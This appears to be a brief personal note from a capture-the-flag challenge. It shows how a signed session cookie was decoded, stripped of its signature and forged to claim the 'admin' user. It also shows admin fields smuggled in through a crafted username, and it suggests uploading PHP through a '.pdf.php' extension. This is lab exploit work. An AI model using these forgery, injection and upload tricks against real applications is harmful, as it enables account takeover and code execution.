# Tips
hardcoded creds

# Fucking with cookies
when I create user: derwent, pass: opensesami, cookie on localhost is:
```
eyJhbGciOiJIUzI1NiIsImlhdCI6MTQ5ODY5NzM2NX0.eyJ1c2VybmFtZSI6ImRlcndlbnQiLH0%3D.0ca7898c6bab1bdbbd248050190d17b5194d96bf1747c67691f047123fe9abdc
```
translates to:
```
  > echo eyJhbGciOiJIUzI1NiIsImlhdCI6MTQ5ODY5NjcyMn0 | base64 -D
  {"alg":"HS256","iat":1498696722}
  > echo eyJ1c2VybmFtZSI6ImRlcndlbnQiLH0= | base64 -D
  {"username":"derwent",}
  <signature>
```
delete signature and set username to admin:
```
  > echo '{"username":"admin"}' | base64
  eyJ1c2VybmFtZSI6ImFkbWluIn0K
  # set cookie to: eyJhbGciOiJIUzI1NiIsImlhdCI6MTQ5ODY5NzM2NX0.eyJ1c2VybmFtZSI6ImFkbWluIn0K.
```
I don't think this works because missing ',' at the end
```
  > echo '{"username":"admin",}' | base64 | escape
  eyJ1c2VybmFtZSI6ImFkbWluIix9Cg%3D%3D
  # set cookie to: eyJhbGciOiJIUzI1NiIsImlhdCI6MTQ5ODY5NzM2NX0.eyJ1c2VybmFtZSI6ImFkbWluIix9Cg%3D%3D.
```

Works! :D

# Fucking with json
Let's assume the signature stuff works.
```
  > php -f ~/Documents/GitHub/sectalks-snippets/sectalks-melbourne-0x0f/json.php
  # set cookie to: eyJhbGciOiJIUzI1NiIsImlhdCI6MTQ5ODcwMDkwM30.eyJrZXkiOiJ1c2VybmFtZTpkZXJ3ZW50LHVzZXJuYW1lOmFkbWluLGJsYWg6IiwidmFsdWUiOiJkZXJ3ZW50Iix9.4e3d4d5718c5164a19a2fa65fde76e4cd10bd6bd1039c8205dc91f509b04e0c9
```

Wow I can't believe that works!

Also works if create user: "derwent,username:admin,blah:"


# files

upload php file with .pdf.php extension
